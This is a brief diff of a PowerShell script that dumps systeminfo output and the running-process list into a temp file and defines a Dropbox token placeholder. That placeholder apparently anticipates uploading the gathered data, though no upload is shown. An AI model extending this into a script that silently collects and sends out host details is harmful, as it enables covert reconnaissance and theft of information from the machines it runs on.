@@ -1,5 +1,6 @@
 $dropboxToken = "your-token-here"
 $outputFile = "$env:temp\systeminfo.txt"
+
 systeminfo > $outputFile
 Add-Content -Path $outputFile -Value "`n===== Running Processes =====`n"
 Get-Process | Out-File -FilePath $outputFile -Append
